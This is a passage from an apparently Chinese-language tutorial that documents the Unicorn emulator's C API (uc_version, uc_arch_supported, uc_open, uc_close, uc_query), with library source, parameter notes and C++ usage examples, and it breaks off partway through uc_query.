aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">uc_version</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *major, <span class="keyword">unsigned</span> <span class="keyword">int</span> *minor)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (major != <span class="literal">NULL</span> &amp;&amp; minor != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        *major = UC_API_MAJOR;  <span class="comment">//宏</span></span><br><span class="line">        *minor = UC_API_MINOR;  <span class="comment">//宏</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (UC_API_MAJOR &lt;&lt; <span class="number">8</span>) + UC_API_MINOR;   <span class="comment">//(major &lt;&lt; 8 | minor)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>编译后不可更改，不接受自定义版本</p><p>使用示例：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"unicorn/unicorn.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> version;</span><br><span class="line">    version = uc_version(<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; hex &lt;&lt; version &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>输出：</p><p><a href="https://i.loli.net/2020/01/18/q3JtOQRPl5xTFKp.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/18/q3JtOQRPl5xTFKp.png" class="lazyload"></a></p><p>得到版本号1.0.0</p><h3 id="uc-arch-supported"><a href="#uc-arch-supported" class="headerlink" title="uc_arch_supported"></a>uc_arch_supported</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">uc_arch_supported</span><span class="params">(uc_arch arch)</span></span>;</span><br></pre></td></tr></table></figure></div><p>确定Unicorn是否支持当前架构</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@arch: 架构类型 (UC_ARCH_*)</span><br><span class="line">@return 如果支持返回True</span><br></pre></td></tr></table></figure></div><p>源码实现</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">uc_arch_supported</span><span class="params">(uc_arch arch)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (arch) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_ARM</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_ARM:   <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_ARM64</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_ARM64: <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_M68K</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_M68K:  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_MIPS</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_MIPS:  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_PPC</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_PPC:   <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_SPARC</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_SPARC: <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_X86</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_X86:   <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="comment">/* 无效或禁用架构 */</span></span><br><span class="line">        <span class="keyword">default</span>:            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>使用示例：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"unicorn/unicorn.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"是否支持UC_ARCH_X86架构："</span> &lt;&lt; uc_arch_supported(UC_ARCH_X86) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>输出：</p><p><a href="https://i.loli.net/2020/01/18/NExsavSgu4yMbBQ.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/18/NExsavSgu4yMbBQ.png" class="lazyload"></a></p><h3 id="uc-open"><a href="#uc-open" class="headerlink" title="uc_open"></a>uc_open</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_open</span><span class="params">(uc_arch arch, uc_mode mode, uc_engine **uc)</span></span>;</span><br></pre></td></tr></table></figure></div><p>创建新的Unicorn实例</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@arch: 架构类型 (UC_ARCH_*)</span><br><span class="line">@mode: 硬件模式. 由 UC_MODE_* 组合</span><br><span class="line">@uc: 指向 uc_engine 的指针, 返回时更新</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure></div><p>源码实现</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_open</span><span class="params">(uc_arch arch, uc_mode mode, uc_engine **result)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uc_struct</span> *<span class="title">uc</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (arch &lt; UC_ARCH_MAX) &#123;</span><br><span class="line">        uc = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(*uc));  <span class="comment">//申请内存</span></span><br><span class="line">        <span class="keyword">if</span> (!uc) &#123;</span><br><span class="line">            <span class="comment">// 内存不足</span></span><br><span class="line">            <span class="keyword">return</span> UC_ERR_NOMEM;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        uc-&gt;errnum = UC_ERR_OK;</span><br><span class="line">        uc-&gt;arch = arch;</span><br><span class="line">        uc-&gt;mode = mode;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 初始化</span></span><br><span class="line">        <span class="comment">// uc-&gt;ram_list = &#123; .blocks = QTAILQ_HEAD_INITIALIZER(ram_list.blocks) &#125;;</span></span><br><span class="line">        uc-&gt;ram_list.blocks.tqh_first = <span class="literal">NULL</span>;</span><br><span class="line">        uc-&gt;ram_list.blocks.tqh_last = &amp;(uc-&gt;ram_list.blocks.tqh_first);</span><br><span class="line"></span><br><span class="line">        uc-&gt;memory_listeners.tqh_first = <span class="literal">NULL</span>;</span><br><span class="line">        uc-&gt;memory_listeners.tqh_last = &amp;uc-&gt;memory_listeners.tqh_first;</span><br><span class="line"></span><br><span class="line">        uc-&gt;address_spaces.tqh_first = <span class="literal">NULL</span>;</span><br><span class="line">        uc-&gt;address_spaces.tqh_last = &amp;uc-&gt;address_spaces.tqh_first;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(arch) &#123;   <span class="comment">// 根据架构进行预处理</span></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_M68K</span></span><br><span class="line">            <span class="keyword">case</span> UC_ARCH_M68K:</span><br><span class="line">                <span class="keyword">if</span> ((mode &amp; ~UC_MODE_M68K_MASK) ||</span><br><span class="line">                        !(mode &amp; UC_MODE_BIG_ENDIAN)) &#123;</span><br><span class="line">                    <span class="built_in">free</span>(uc);</span><br><span class="line">                    <span class="keyword">return</span> UC_ERR_MODE;</span><br><span class="line">                &#125;</span><br><span class="line">                uc-&gt;init_arch = m68k_uc_init;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_X86</span></span><br><span class="line">            <span class="keyword">case</span> UC_ARCH_X86:</span><br><span class="line">                <span class="keyword">if</span> ((mode &amp; ~UC_MODE_X86_MASK) ||</span><br><span class="line">                        (mode &amp; UC_MODE_BIG_ENDIAN) ||</span><br><span class="line">                        !(mode &amp; (UC_MODE_16|UC_MODE_32|UC_MODE_64))) &#123;</span><br><span class="line">                    <span class="built_in">free</span>(uc);</span><br><span class="line">                    <span class="keyword">return</span> UC_ERR_MODE;</span><br><span class="line">                &#125;</span><br><span class="line">                uc-&gt;init_arch = x86_uc_init;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_ARM</span></span><br><span class="line">            <span class="keyword">case</span> UC_ARCH_ARM:</span><br><span class="line">                <span class="keyword">if</span> ((mode &amp; ~UC_MODE_ARM_MASK)) &#123;</span><br><span class="line">                    <span class="built_in">free</span>(uc);</span><br><span class="line">                    <span class="keyword">return</span> UC_ERR_MODE;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (mode &amp; UC_MODE_BIG_ENDIAN) &#123;</span><br><span class="line">                    uc-&gt;init_arch = armeb_uc_init;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    uc-&gt;init_arch = arm_uc_init;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (mode &amp; UC_MODE_THUMB)</span><br><span class="line">                    uc-&gt;thumb = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_ARM64</span></span><br><span class="line">            <span class="keyword">case</span> UC_ARCH_ARM64:</span><br><span class="line">                <span class="keyword">if</span> (mode &amp; ~UC_MODE_ARM_MASK) &#123;</span><br><span class="line">                    <span class="built_in">free</span>(uc);</span><br><span class="line">                    <span class="keyword">return</span> UC_ERR_MODE;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (mode &amp; UC_MODE_BIG_ENDIAN) &#123;</span><br><span class="line">                    uc-&gt;init_arch = arm64eb_uc_init;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    uc-&gt;init_arch = arm64_uc_init;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(UNICORN_HAS_MIPS) || defined(UNICORN_HAS_MIPSEL) || defined(UNICORN_HAS_MIPS64) || defined(UNICORN_HAS_MIPS64EL)</span></span><br><span class="line">            <span class="keyword">case</span> UC_ARCH_MIPS:</span><br><span class="line">                <span class="keyword">if</span> ((mode &amp; ~UC_MODE_MIPS_MASK) ||</span><br><span class="line">                        !(mode &amp; (UC_MODE_MIPS32|UC_MODE_MIPS64))) &#123;</span><br><span class="line">                    <span class="built_in">free</span>(uc);</span><br><span class="line">                    <span class="keyword">return</span> UC_ERR_MODE;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (mode &amp; UC_MODE_BIG_ENDIAN) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_MIPS</span></span><br><span class="line">                    <span class="keyword">if</span> (mode &amp; UC_MODE_MIPS32)</span><br><span class="line">                        uc-&gt;init_arch = mips_uc_init;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_MIPS64</span></span><br><span class="line">                    <span class="keyword">if</span> (mode &amp; UC_MODE_MIPS64)</span><br><span class="line">                        uc-&gt;init_arch = mips64_uc_init;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;    <span class="comment">// 小端序</span></span><br><span class="line">#ifdef UNICORN_HAS_MIPSEL</span><br><span class="line">                    <span class="keyword">if</span> (mode &amp; UC_MODE_MIPS32)</span><br><span class="line">                        uc-&gt;init_arch = mipsel_uc_init;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_MIPS64EL</span></span><br><span class="line">                    <span class="keyword">if</span> (mode &amp; UC_MODE_MIPS64)</span><br><span class="line">                        uc-&gt;init_arch = mips64el_uc_init;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_SPARC</span></span><br><span class="line">            <span class="keyword">case</span> UC_ARCH_SPARC:</span><br><span class="line">                <span class="keyword">if</span> ((mode &amp; ~UC_MODE_SPARC_MASK) ||</span><br><span class="line">                        !(mode &amp; UC_MODE_BIG_ENDIAN) ||</span><br><span class="line">                        !(mode &amp; (UC_MODE_SPARC32|UC_MODE_SPARC64))) &#123;</span><br><span class="line">                    <span class="built_in">free</span>(uc);</span><br><span class="line">                    <span class="keyword">return</span> UC_ERR_MODE;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (mode &amp; UC_MODE_SPARC64)</span><br><span class="line">                    uc-&gt;init_arch = sparc64_uc_init;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    uc-&gt;init_arch = sparc_uc_init;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (uc-&gt;init_arch == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> UC_ERR_ARCH;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (machine_initialize(uc))</span><br><span class="line">            <span class="keyword">return</span> UC_ERR_RESOURCE;</span><br><span class="line"></span><br><span class="line">        *result = uc;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (uc-&gt;reg_reset)</span><br><span class="line">            uc-&gt;reg_reset(uc);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_ARCH;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><strong>注意： uc_open会申请堆内存，使用完必须用uc_close释放，否则会发生泄露</strong></p><p>使用示例：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"unicorn/unicorn.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    uc_engine* uc;</span><br><span class="line">    uc_err err;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//// 初始化 X86-32bit 模式模拟器</span></span><br><span class="line">    err = uc_open(UC_ARCH_X86, UC_MODE_32, &amp;uc);</span><br><span class="line">    <span class="keyword">if</span> (err != UC_ERR_OK) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_open() with error returned: %u\n"</span>, err);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!err)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"uc引擎创建成功"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//// 关闭uc</span></span><br><span class="line">    err = uc_close(uc);</span><br><span class="line">    <span class="keyword">if</span> (err != UC_ERR_OK) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_close() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!err)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"uc引擎关闭成功"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>输出</p><p><a href="https://i.loli.net/2020/01/18/dqKBwAWUL7XvypE.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/18/dqKBwAWUL7XvypE.png" class="lazyload"></a></p><h3 id="uc-close"><a href="#uc-close" class="headerlink" title="uc_close"></a>uc_close</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_close</span><span class="params">(uc_engine *uc)</span></span>;</span><br></pre></td></tr></table></figure></div><p>关闭一个uc实例，将释放内存。关闭后无法恢复。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: 指向由 uc_open() 返回的指针</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure></div><p>源码实现</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_close</span><span class="params">(uc_engine *uc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_item</span> *<span class="title">cur</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hook</span> *<span class="title">hook</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理内部数据</span></span><br><span class="line">    <span class="keyword">if</span> (uc-&gt;<span class="built_in">release</span>)</span><br><span class="line">        uc-&gt;<span class="built_in">release</span>(uc-&gt;tcg_ctx);</span><br><span class="line">    g_free(uc-&gt;tcg_ctx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理 CPU.</span></span><br><span class="line">    g_free(uc-&gt;cpu-&gt;tcg_as_listener);</span><br><span class="line">    g_free(uc-&gt;cpu-&gt;thread);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理所有 objects.</span></span><br><span class="line">    OBJECT(uc-&gt;machine_state-&gt;accelerator)-&gt;ref = <span class="number">1</span>;</span><br><span class="line">    OBJECT(uc-&gt;machine_state)-&gt;ref = <span class="number">1</span>;</span><br><span class="line">    OBJECT(uc-&gt;owner)-&gt;ref = <span class="number">1</span>;</span><br><span class="line">    OBJECT(uc-&gt;root)-&gt;ref = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    object_unref(uc, OBJECT(uc-&gt;machine_state-&gt;accelerator));</span><br><span class="line">    object_unref(uc, OBJECT(uc-&gt;machine_state));</span><br><span class="line">    object_unref(uc, OBJECT(uc-&gt;cpu));</span><br><span class="line">    object_unref(uc, OBJECT(&amp;uc-&gt;io_mem_notdirty));</span><br><span class="line">    object_unref(uc, OBJECT(&amp;uc-&gt;io_mem_unassigned));</span><br><span class="line">    object_unref(uc, OBJECT(&amp;uc-&gt;io_mem_rom));</span><br><span class="line">    object_unref(uc, OBJECT(uc-&gt;root));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放内存</span></span><br><span class="line">    g_free(uc-&gt;system_memory);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放相关线程</span></span><br><span class="line">    <span class="keyword">if</span> (uc-&gt;qemu_thread_data)</span><br><span class="line">        g_free(uc-&gt;qemu_thread_data);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放其他数据</span></span><br><span class="line">    <span class="built_in">free</span>(uc-&gt;l1_map);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (uc-&gt;bounce.<span class="built_in">buffer</span>) &#123;</span><br><span class="line">        <span class="built_in">free</span>(uc-&gt;bounce.<span class="built_in">buffer</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    g_hash_table_foreach(uc-&gt;type_table, free_table, uc);</span><br><span class="line">    g_hash_table_destroy(uc-&gt;type_table);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; DIRTY_MEMORY_NUM; i++) &#123;</span><br><span class="line">        <span class="built_in">free</span>(uc-&gt;ram_list.dirty_memory[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放hook和hook列表</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; UC_HOOK_MAX; i++) &#123;</span><br><span class="line">        cur = uc-&gt;hook[i].head;</span><br><span class="line">        <span class="comment">// hook 可存在于多个列表，可通过计数获取释放的时间</span></span><br><span class="line">        <span class="keyword">while</span> (cur) &#123;</span><br><span class="line">            hook = (struct hook *)cur-&gt;data;</span><br><span class="line">            <span class="keyword">if</span> (--hook-&gt;refs == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">free</span>(hook);</span><br><span class="line">            &#125;</span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        list_clear(&amp;uc-&gt;hook[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(uc-&gt;mapped_blocks);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 最后释放uc自身</span></span><br><span class="line">    <span class="built_in">memset</span>(uc, <span class="number">0</span>, <span class="keyword">sizeof</span>(*uc));</span><br><span class="line">    <span class="built_in">free</span>(uc);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>使用实例同uc_open()</p><h3 id="uc-query"><a href="#uc-query" class="headerlink" title="uc_query"></a>uc_query</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_query</span><span class="params">(uc_engine *uc, uc_query_type type, <span class="keyword">size_t</span> *result)</span></span>;</span><br></pre></td></tr></table></figure></div><p>查询引擎的内部状态</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: uc_open() 返回的句柄</span><br><span class="line">@type: uc_query_type 中枚举的类型</span><br><span class="line"></span><br><span class="line">@result: 保存被查询的内部状态的指针</span><br><span class="line"></span><br><span class="line">@return: 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure></div><p>源码实现</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_query</span><span class="params">(uc_engine *uc, uc_query_type type, <span class="keyword">size_t</span> *result)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (type == UC_QUERY_PAGE_SIZE) &#123;</span><br><span class="line">        *result = uc-&gt;target_page_size;</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (type == UC_QUERY_ARCH) &#123;</span><br><span class="line">        *result = uc-&gt;arch;</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(uc-&gt;arch) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_ARM</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_ARM:</span><br><span class="line">            <span class="keyword">return</span> uc-&gt;query(uc, type, result);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> 